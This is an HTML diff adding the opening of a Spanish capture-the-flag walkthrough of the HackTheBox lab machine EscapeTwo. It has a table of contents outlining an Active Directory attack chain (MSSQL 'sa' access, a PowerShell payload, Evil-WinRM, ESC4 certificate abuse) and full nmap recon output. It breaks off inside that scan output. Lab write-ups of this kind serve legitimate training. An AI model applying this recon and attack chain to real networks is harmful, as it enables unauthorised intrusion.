@@ -1,0 +1,908 @@
+
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Walkthrough EscapeTwo</title>
+  <style>
+    body {
+      background-color: #0d1117;
+      color: #00e81f;
+      font-family: 'Fira Code', monospace;
+      padding: 30px;
+    }
+
+    h1 {
+      color: #ff004f;
+      font-size: 2.5em;
+      border-bottom: 2px solid #1f6feb;
+      padding-bottom: 10px;
+    }
+
+    .meta {
+      margin-top: 10px;
+      color: #00ff91;
+      font-size: 0.9em;
+    }
+
+    .username {
+      color: #1f6feb;
+    }
+
+    h2 {
+      color: #ffa500;
+      border-bottom: 1px solid #1f6feb;
+      padding-bottom: 5px;
+    }
+
+    pre {
+      background-color: #161b22;
+      color: #f0f6fc;
+      padding: 15px;
+      border-radius: 10px;
+      overflow-x: auto;
+      margin: 15px 0;
+    }
+
+    a {
+      color: magenta;
+      text-decoration: none;
+    }
+
+    a:hover {
+      text-decoration: underline;
+    }
+
+    .table-of-contents {
+      margin-top: 30px;
+    }
+
+  </style>
+</head>
+<body>
+
+  <h1>Hackthebox >> EscapeTwo</h1>
+
+  <div class="table-of-contents">
+    <h2>▶ Tabla de Contenidos</h2>
+    <ul>
+      <li><a href="#info">🔍 Información de la máquina</a></li>
+      <li><a href="#nmap">🔎 Escaneo con Nmap</a></li>
+      <li><a href="#web">🌐 Enumeración de recursos SMB con credenciales válidas</a></li>
+      <li><a href="#wp">💾 Acceso a base de datos MSSQL con credenciales 'sa'</a></li>
+      <li><a href="#joker">🃏 Generación y ejecución de payload PowerShell con PowerJoker</a></li>
+      <li><a href="#nxc">💽 Ataque y enumeración LDAP para descubrimiento de usuarios válidos</a></li>
+      <li><a href="#user">👤 Acceso remoto con Evil-WinRM y obtención de user.txt</a></li>
+      <li><a href="#blood">🐶 Enumeración y análisis de Active Directory con BloodHound</a></li>
+      <li><a href="#cambio">🫂 Modificación de Propietario y Permisos en Active Directory</a></li>
+      <li><a href="#privilege">👺 Escalada a Administrator explotando AD CS mediante ESC4 (Certipy + Evil-WinRM)</a></li>
+    </ul>
+  </div>
+
+  <h2 id="info">🔍 Información de la máquina</h2>
+  <p>Una máquina enfocada en la explotación de Active Directory, ideal para principiantes que desean profundizar en técnicas de escalada de privilegios y explotación de servicios comunes en entornos Windows.</p>
+  <p>🛠️ Herramientas Recomendadas:</p>
+  <ul>
+    <li>Nmap: Para escaneo de puertos y servicios.</li>
+    <li>Netexec: Para enumeración de SMB y autenticación.</li>
+    <li>Evil-WinRM: Para obtener shells remotas en Windows.</li>
+    <li>Impacket: Para interactuar con servicios como MSSQL.</li>
+    <li>Certipy: Para explotación de Active Directory Certificate Services.</li>
+  </ul>
+
+  <h2 id="nmap">🔎 Escaneo con Nmap</h2>
+
+<pre>#nmap -sC -sV -T5 -vv --open 10.10.11.51
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-16 11:13 AST
+NSE: Loaded 156 scripts for scanning.
+NSE: Script Pre-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 11:13
+Completed NSE at 11:13, 0.00s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 11:13
+Completed NSE at 11:13, 0.00s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 11:13
+Completed NSE at 11:13, 0.00s elapsed
+Initiating Ping Scan at 11:13
+Scanning 10.10.11.51 [4 ports]
+Completed Ping Scan at 11:13, 0.30s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 11:13
+Completed Parallel DNS resolution of 1 host. at 11:13, 0.10s elapsed
+Initiating SYN Stealth Scan at 11:13
+Scanning 10.10.11.51 [1000 ports]
+Discovered open port 135/tcp on 10.10.11.51
+Discovered open port 445/tcp on 10.10.11.51
+Discovered open port 139/tcp on 10.10.11.51
+Discovered open port 53/tcp on 10.10.11.51
+Discovered open port 389/tcp on 10.10.11.51
+Discovered open port 3269/tcp on 10.10.11.51
+Discovered open port 593/tcp on 10.10.11.51
+Discovered open port 464/tcp on 10.10.11.51
+Warning: 10.10.11.51 giving up on port because retransmission cap hit (2).
+Discovered open port 88/tcp on 10.10.11.51
+Discovered open port 636/tcp on 10.10.11.51
+Discovered open port 1433/tcp on 10.10.11.51
+Discovered open port 3268/tcp on 10.10.11.51
+Completed SYN Stealth Scan at 11:13, 16.92s elapsed (1000 total ports)
+Initiating Service scan at 11:13
+Scanning 12 services on 10.10.11.51
+Completed Service scan at 11:14, 50.14s elapsed (12 services on 1 host)
+NSE: Script scanning 10.10.11.51.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 11:14
+NSE Timing: About 99.94% done; ETC: 11:14 (0:00:00 remaining)
+Completed NSE at 11:15, 40.40s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 11:15
+Completed NSE at 11:15, 3.10s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 11:15
+Completed NSE at 11:15, 0.01s elapsed
+Nmap scan report for 10.10.11.51
+Host is up, received echo-reply ttl 127 (0.13s latency).
+Scanned at 2025-05-16 11:13:18 AST for 111s
+Not shown: 988 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT     STATE SERVICE       REASON          VERSION
+53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
+88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-05-16 15:13:24Z)
+135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
+389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=DC01.sequel.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
+| Issuer: commonName=sequel-DC01-CA/domainComponent=sequel
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2024-06-08T17:35:00
+| Not valid after:  2025-06-08T17:35:00
+| MD5:   09fd:3df4:9f58:da05:410d:e89e:7442:b6ff
+| SHA-1: c3ac:8bfd:6132:ed77:2975:7f5e:6990:1ced:528e:aac5
+| -----BEGIN CERTIFICATE-----
+| MIIGJjCCBQ6gAwIBAgITVAAAAANDveocXlnSDQAAAAAAAzANBgkqhkiG9w0BAQsF
+| ADBGMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs
+| MRcwFQYDVQQDEw5zZXF1ZWwtREMwMS1DQTAeFw0yNDA2MDgxNzM1MDBaFw0yNTA2
+| MDgxNzM1MDBaMBoxGDAWBgNVBAMTD0RDMDEuc2VxdWVsLmh0YjCCASIwDQYJKoZI
+| hvcNAQEBBQADggEPADCCAQoCggEBANRCnm8pZ86LZP3kAtl29rFgY5gEOEXSCZSm
+| F6Ai+1vh6a8LrCRKMWtC8+Kla0PXgjTcGcmDawcI8h0BsaSH6sQVAD21ca5MQcv0
+| xf+4TzrvAnp9H+pVHO1r42cLXBwq14Ak8dSueiOLgxoLKO1CDtKk+e8ZxQWf94Bp
+| Vu8rnpImFT6IeDgACeBfb0hLzK2JJRT9ezZiUVxoTfMKKuy4IPFWcshW/1bQfEK0
+| ExOcQZVaoCJzRPBUVTp/XGHEW9d6abW8h1UR+64qVfGexsrUKBfxKRsHuHTxa4ts
+| +qUVJRbJkzlSgyKGMjhNfT3BPVwwP8HvErWvbsWKKPRkvMaPhU0CAwEAAaOCAzcw
+| ggMzMC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8AbABs
+| AGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/BAQD
+| AgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3DQME
+| AgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjALBglg
+| hkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFNfVXsrpSahW
+| xfdL4wxFDgtUztvRMB8GA1UdIwQYMBaAFMZBubbkDkfWBlps8YrGlP0a+7jDMIHI
+| BgNVHR8EgcAwgb0wgbqggbeggbSGgbFsZGFwOi8vL0NOPXNlcXVlbC1EQzAxLUNB
+| LENOPURDMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNl
+| cnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9c2VxdWVsLERDPWh0Yj9jZXJ0aWZp
+| Y2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0
+| aW9uUG9pbnQwgb8GCCsGAQUFBwEBBIGyMIGvMIGsBggrBgEFBQcwAoaBn2xkYXA6
+| Ly8vQ049c2VxdWVsLURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNl
+| cnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9c2VxdWVsLERD
+| PWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlv
+| bkF1dGhvcml0eTA7BgNVHREENDAyoB8GCSsGAQQBgjcZAaASBBDjAT1NPPfwT4sa
+| sNjnBqS3gg9EQzAxLnNlcXVlbC5odGIwTQYJKwYBBAGCNxkCBEAwPqA8BgorBgEE
+| AYI3GQIBoC4ELFMtMS01LTIxLTU0ODY3MDM5Ny05NzI2ODc0ODQtMzQ5NjMzNTM3
+| MC0xMDAwMA0GCSqGSIb3DQEBCwUAA4IBAQCBDjlZZbFac6RlhZ2BhLzvWmA1Xcyn
+| jZmYF3aOXmmof1yyO/kxk81fStsu3gtZ94KmpkBwmd1QkSJCuT54fTxg17xDtA49
+| QF7O4DPsFkeOM2ip8TAf8x5bGwH5tlZvNjllBCgSpCupZlNY8wKYnyKQDNwtWtgL
+| UF4SbE9Q6JWA+Re5lPa6AoUr/sRzKxcPsAjK8kgquUA0spoDrxAqkADIRsHgBLGY
+| +Wn+DXHctZtv8GcOwrfW5KkbkVykx8DSS2qH4y2+xbC3ZHjsKlVjoddkjEkrHku0
+| 2iXZSIqShMXzXmLTW/G+LzqK3U3VTcKo0yUKqmLlKyZXzQ+kYVLqgOOX
+|_-----END CERTIFICATE-----
+|_ssl-date: 2025-05-16T15:14:48+00:00; -19s from scanner time.
+445/tcp  open  microsoft-ds? syn-ack ttl 127
+464/tcp  open  kpasswd5?     syn-ack ttl 127
+593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
+|_ssl-date: 2025-05-16T15:14:48+00:00; -19s from scanner time.
+| ssl-cert: Subject: commonName=DC01.sequel.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
+| Issuer: commonName=sequel-DC01-CA/domainComponent=sequel
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2024-06-08T17:35:00
+| Not valid after:  2025-06-08T17:35:00
+| MD5:   09fd:3df4:9f58:da05:410d:e89e:7442:b6ff
+| SHA-1: c3ac:8bfd:6132:ed77:2975:7f5e:6990:1ced:528e:aac5
+| -----BEGIN CERTIFICATE-----
+| MIIGJjCCBQ6gAwIBAgITVAAAAANDveocXlnSDQAAAAAAAzANBgkqhkiG9w0BAQsF
+| ADBGMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs
+| MRcwFQYDVQQDEw5zZXF1ZWwtREMwMS1DQTAeFw0yNDA2MDgxNzM1MDBaFw0yNTA2
+| MDgxNzM1MDBaMBoxGDAWBgNVBAMTD0RDMDEuc2VxdWVsLmh0YjCCASIwDQYJKoZI
+| hvcNAQEBBQADggEPADCCAQoCggEBANRCnm8pZ86LZP3kAtl29rFgY5gEOEXSCZSm
+| F6Ai+1vh6a8LrCRKMWtC8+Kla0PXgjTcGcmDawcI8h0BsaSH6sQVAD21ca5MQcv0
+| xf+4TzrvAnp9H+pVHO1r42cLXBwq14Ak8dSueiOLgxoLKO1CDtKk+e8ZxQWf94Bp
+| Vu8rnpImFT6IeDgACeBfb0hLzK2JJRT9ezZiUVxoTfMKKuy4IPFWcshW/1bQfEK0
+| ExOcQZVaoCJzRPBUVTp/XGHEW9d6abW8h1UR+64qVfGexsrUKBfxKRsHuHTxa4ts
+| +qUVJRbJkzlSgyKGMjhNfT3BPVwwP8HvErWvbsWKKPRkvMaPhU0CAwEAAaOCAzcw
+| ggMzMC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8AbABs
+| AGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/BAQD
+| AgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3DQME
+| AgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjALBglg
+| hkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFNfVXsrpSahW
+| xfdL4wxFDgtUztvRMB8GA1UdIwQYMBaAFMZBubbkDkfWBlps8YrGlP0a+7jDMIHI
+| BgNVHR8EgcAwgb0wgbqggbeggbSGgbFsZGFwOi8vL0NOPXNlcXVlbC1EQzAxLUNB
+| LENOPURDMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNl
+| cnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9c2VxdWVsLERDPWh0Yj9jZXJ0aWZp
+| Y2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0
+| aW9uUG9pbnQwgb8GCCsGAQUFBwEBBIGyMIGvMIGsBggrBgEFBQcwAoaBn2xkYXA6
+| Ly8vQ049c2VxdWVsLURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNl
+| cnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9c2VxdWVsLERD
+| PWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlv
+| bkF1dGhvcml0eTA7BgNVHREENDAyoB8GCSsGAQQBgjcZAaASBBDjAT1NPPfwT4sa
+| sNjnBqS3gg9EQzAxLnNlcXVlbC5odGIwTQYJKwYBBAGCNxkCBEAwPqA8BgorBgEE
+| AYI3GQIBoC4ELFMtMS01LTIxLTU0ODY3MDM5Ny05NzI2ODc0ODQtMzQ5NjMzNTM3
+| MC0xMDAwMA0GCSqGSIb3DQEBCwUAA4IBAQCBDjlZZbFac6RlhZ2BhLzvWmA1Xcyn
+| jZmYF3aOXmmof1yyO/kxk81fStsu3gtZ94KmpkBwmd1QkSJCuT54fTxg17xDtA49
+| QF7O4DPsFkeOM2ip8TAf8x5bGwH5tlZvNjllBCgSpCupZlNY8wKYnyKQDNwtWtgL
+| UF4SbE9Q6JWA+Re5lPa6AoUr/sRzKxcPsAjK8kgquUA0spoDrxAqkADIRsHgBLGY
+| +Wn+DXHctZtv8GcOwrfW5KkbkVykx8DSS2qH4y2+xbC3ZHjsKlVjoddkjEkrHku0
+| 2iXZSIqShMXzXmLTW/G+LzqK3U3VTcKo0yUKqmLlKyZXzQ+kYVLqgOOX
+|_-----END CERTIFICATE-----
+1433/tcp open  ms-sql-s      syn-ack ttl 127 Microsoft SQL Server 2019 15.00.2000.00; RTM
+|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
+|_ssl-date: 2025-05-16T15:14:48+00:00; -19s from scanner time.
+|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
+| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
+| Issuer: commonName=SSL_Self_Signed_Fallback
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2025-05-16T10:02:53
+| Not valid after:  2055-05-16T10:02:53
+| MD5:   8b8d:3048:0915:765e:bb50:02f9:5b6d:9e0d
+| SHA-1: 54cf:d5ef:7cf8:62d6:67ae:9e92:1354:8c93:35d1:760f
+| -----BEGIN CERTIFICATE-----
+| MIIDADCCAeigAwIBAgIQE17Zlr+BG71E37rFA0HfczANBgkqhkiG9w0BAQsFADA7
+| MTkwNwYDVQQDHjAAUwBTAEwAXwBTAGUAbABmAF8AUwBpAGcAbgBlAGQAXwBGAGEA
+| bABsAGIAYQBjAGswIBcNMjUwNTE2MTAwMjUzWhgPMjA1NTA1MTYxMDAyNTNaMDsx
+| OTA3BgNVBAMeMABTAFMATABfAFMAZQBsAGYAXwBTAGkAZwBuAGUAZABfAEYAYQBs
+| AGwAYgBhAGMAazCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBALCuDr0f
+| WzLydhabms83ITaV1c8k9g22hoD2HWhclG6RhWJAg39SCYVjEwQCnJEnpd5a9P7q
+| 3WXNRebRsIwizYcglT+0hmKhkCkVwJiBCV5rjALMZLnRMxaWCEv4DHkn6kntjoPj
+| DeOMK9cin1Z0J3nPrLBRUMlpxIMSgRXuJ5V4HV1PiC0M3vui4hgt2/rsy0OHlnkB
+| jvgIVu4DzvWMZ69GMfImxqABi3Qq0WgdR067WRPWHZ8tBpkCrl6X/wxfwEuoq+qF
+| mexRUdCvKz8TsY5cW8b/gKhp/yepeMK+WfmmpUqNqdwjhUQDO445XTkUYhRmX79p
+| 0IsY7n9apI0Gf7kCAwEAATANBgkqhkiG9w0BAQsFAAOCAQEACjlkahX8PfUT7f4X
+| wu9LH4RpPLbEGuRBIp0csPoeMlrw5gUtUBrrTIg9QuVV7ZKDMhbTl151pMs+6taD
+| 062jYMFJYfmABG1UXuB2iUHlRpjpLuXr5tTDeUOpqryBC/hKM8lVSE/FpURYidMm
+| 080GM5OUp2FQWK2lzrjhjLk9dAK2oC+a8cQLY4v+jjqhJvlts0vCwZ08TlNeG4Yd
+| ctw9RNEtMMvHtrueLOCq56mmeqPniQ21eAHGKqUdFZBFbCVLO+kZxV6l8/OPURLI
+| J7AMQsDCXXX2WhpNs4NnEoy9Wc8v/4N5G42UfsJHeQDII0FCNuoyQmgtFhUf5Noe
+| GMU0fw==
+|_-----END CERTIFICATE-----
+3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=DC01.sequel.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
+| Issuer: commonName=sequel-DC01-CA/domainComponent=sequel
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2024-06-08T17:35:00
+| Not valid after:  2025-06-08T17:35:00
+| MD5:   09fd:3df4:9f58:da05:410d:e89e:7442:b6ff
+| SHA-1: c3ac:8bfd:6132:ed77:2975:7f5e:6990:1ced:528e:aac5
+| -----BEGIN CERTIFICATE-----
+| MIIGJjCCBQ6gAwIBAgITVAAAAANDveocXlnSDQAAAAAAAzANBgkqhkiG9w0BAQsF
+| ADBGMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs
+| MRcwFQYDVQQDEw5zZXF1ZWwtREMwMS1DQTAeFw0yNDA2MDgxNzM1MDBaFw0yNTA2
+| MDgxNzM1MDBaMBoxGDAWBgNVBAMTD0RDMDEuc2VxdWVsLmh0YjCCASIwDQYJKoZI
+| hvcNAQEBBQADggEPADCCAQoCggEBANRCnm8pZ86LZP3kAtl29rFgY5gEOEXSCZSm
+| F6Ai+1vh6a8LrCRKMWtC8+Kla0PXgjTcGcmDawcI8h0BsaSH6sQVAD21ca5MQcv0
+| xf+4TzrvAnp9H+pVHO1r42cLXBwq14Ak8dSueiOLgxoLKO1CDtKk+e8ZxQWf94Bp
+| Vu8rnpImFT6IeDgACeBfb0hLzK2JJRT9ezZiUVxoTfMKKuy4IPFWcshW/1bQfEK0
+| ExOcQZVaoCJzRPBUVTp/XGHEW9d6abW8h1UR+64qVfGexsrUKBfxKRsHuHTxa4ts
+| +qUVJRbJkzlSgyKGMjhNfT3BPVwwP8HvErWvbsWKKPRkvMaPhU0CAwEAAaOCAzcw
+| ggMzMC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8AbABs
+| AGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/BAQD
+| AgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3DQME
+| AgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjALBglg
+| hkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFNfVXsrpSahW
+| xfdL4wxFDgtUztvRMB8GA1UdIwQYMBaAFMZBubbkDkfWBlps8YrGlP0a+7jDMIHI
+| BgNVHR8EgcAwgb0wgbqggbeggbSGgbFsZGFwOi8vL0NOPXNlcXVlbC1EQzAxLUNB
+| LENOPURDMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNl
+| cnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9c2VxdWVsLERDPWh0Yj9jZXJ0aWZp
+| Y2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0
+| aW9uUG9pbnQwgb8GCCsGAQUFBwEBBIGyMIGvMIGsBggrBgEFBQcwAoaBn2xkYXA6
+| Ly8vQ049c2VxdWVsLURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNl
+| cnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9c2VxdWVsLERD
+| PWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlv
+| bkF1dGhvcml0eTA7BgNVHREENDAyoB8GCSsGAQQBgjcZAaASBBDjAT1NPPfwT4sa
+| sNjnBqS3gg9EQzAxLnNlcXVlbC5odGIwTQYJKwYBBAGCNxkCBEAwPqA8BgorBgEE
+| AYI3GQIBoC4ELFMtMS01LTIxLTU0ODY3MDM5Ny05NzI2ODc0ODQtMzQ5NjMzNTM3
+| MC0xMDAwMA0GCSqGSIb3DQEBCwUAA4IBAQCBDjlZZbFac6RlhZ2BhLzvWmA1Xcyn
+| jZmYF3aOXmmof1yyO/kxk81fStsu3gtZ94KmpkBwmd1QkSJCuT54fTxg17xDtA49
+| QF7O4DPsFkeOM2ip8TAf8x5bGwH5tlZvNjllBCgSpCupZlNY8wKYnyKQDNwtWtgL
+| UF4SbE9Q6JWA+Re5lPa6AoUr/sRzKxcPsAjK8kgquUA0spoDrxAqkADIRsHgBLGY
+| +Wn+DXHctZtv8GcOwrfW5KkbkVykx8DSS2qH4y2+xbC3ZHjsKlVjoddkjEkrHku0
+| 2iXZSIqShMXzXmLTW/G+LzqK3U3VTcKo0yUKqmLlKyZXzQ+kYVLqgOOX
+|_-----END CERTIFICATE-----
+|_ssl-date: 2025-05-16T15:14:48+00:00; -19s from scanner time.
+3269/tcp open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
+|_ssl-date: 2025-05-16T15:14:48+00:00; -19s from scanner time.
+| ssl-cert: Subject: commonName=DC01.sequel.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
+| Issuer: commonName=sequel-DC01-CA/domainComponent=sequel
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2024-06-08T17:35:00
+| Not valid after:  2025-06-08T17:35:00
+| MD5:   09fd:3df4:9f58:da05:410d:e89e:7442:b6ff
+| SHA-1: c3ac:8bfd:6132:ed77:2975:7f5e:6990:1ced:528e:aac5
+| -----BEGIN CERTIFICATE-----
+| MIIGJjCCBQ6gAwIBAgITVAAAAANDveocXlnSDQAAAAAAAzANBgkqhkiG9w0BAQsF
+| ADBGMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs
+| MRcwFQYDVQQDEw5zZXF1ZWwtREMwMS1DQTAeFw0yNDA2MDgxNzM1MDBaFw0yNTA2
+| MDgxNzM1MDBaMBoxGDAWBgNVBAMTD0RDMDEuc2VxdWVsLmh0YjCCASIwDQYJKoZI
+| hvcNAQEBBQADggEPADCCAQoCggEBANRCnm8pZ86LZP3kAtl29rFgY5gEOEXSCZSm
+| F6Ai+1vh6a8LrCRKMWtC8+Kla0PXgjTcGcmDawcI8h0BsaSH6sQVAD21ca5MQcv0
+| xf+4TzrvAnp9H+pVHO1r42cLXBwq14Ak8dSueiOLgxoLKO1CDtKk+e8ZxQWf94Bp
+| Vu8rnpImFT6IeDgACeBfb0hLzK2JJRT9ezZiUVxoTfMKKuy4IPFWcshW/1bQfEK0
+| ExOcQZVaoCJzRPBUVTp/XGHEW9d6abW8h1UR+64qVfGexsrUKBfxKRsHuHTxa4ts
+| +qUVJRbJkzlSgyKGMjhNfT3BPVwwP8HvErWvbsWKKPRkvMaPhU0CAwEAAaOCAzcw
+| ggMzMC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8AbABs
+| AGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/BAQD
+| AgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3DQME
+| AgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjALBglg
+| hkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFNfVXsrpSahW
+| xfdL4wxFDgtUztvRMB8GA1UdIwQYMBaAFMZBubbkDkfWBlps8YrGlP0a+7jDMIHI
+| BgNVHR8EgcAwgb0wgbqggbeggbSGgbFsZGFwOi8vL0NOPXNlcXVlbC1EQzAxLUNB
+| LENOPURDMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNl
+| cnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9c2VxdWVsLERDPWh0Yj9jZXJ0aWZp
+| Y2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0
+| aW9uUG9pbnQwgb8GCCsGAQUFBwEBBIGyMIGvMIGsBggrBgEFBQcwAoaBn2xkYXA6
+| Ly8vQ049c2VxdWVsLURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNl
+| cnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9c2VxdWVsLERD
+| PWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlv
+| bkF1dGhvcml0eTA7BgNVHREENDAyoB8GCSsGAQQBgjcZAaASBBDjAT1NPPfwT4sa
+| sNjnBqS3gg9EQzAxLnNlcXVlbC5odGIwTQYJKwYBBAGCNxkCBEAwPqA8BgorBgEE
+| AYI3GQIBoC4ELFMtMS01LTIxLTU0ODY3MDM5Ny05NzI2ODc0ODQtMzQ5NjMzNTM3
+| MC0xMDAwMA0GCSqGSIb3DQEBCwUAA4IBAQCBDjlZZbFac6RlhZ2BhLzvWmA1Xcyn
+| jZmYF3aOXmmof1yyO/kxk81fStsu3gtZ94KmpkBwmd1QkSJCuT54fTxg17xDtA49
+| QF7O4DPsFkeOM2ip8TAf8x5bGwH5tlZvNjllBCgSpCupZlNY8wKYnyKQDNwtWtgL
+| UF4SbE9Q6JWA+Re5lPa6AoUr/sRzKxcPsAjK8kgquUA0spoDrxAqkADIRsHgBLGY
+| +Wn+DXHctZtv8GcOwrfW5KkbkVykx8DSS2qH4y2+xbC3ZHjsKlVjoddkjEkrHku0
+| 2iXZSIqShMXzXmLTW/G+LzqK3U3VTcKo0yUKqmLlKyZXzQ+kYVLqgOOX
+|_-----END CERTIFICATE-----
+Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: -19s, deviation: 0s, median: -19s
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+| p2p-conficker: 
+|   Checking for Conficker.C or higher...
+|   Check 1 (port 62012/tcp): CLEAN (Timeout)
+|   Check 2 (port 50294/tcp): CLEAN (Timeout)
+|   Check 3 (port 20179/udp): CLEAN (Timeout)
+|   Check 4 (port 51699/udp): CLEAN (Timeout)
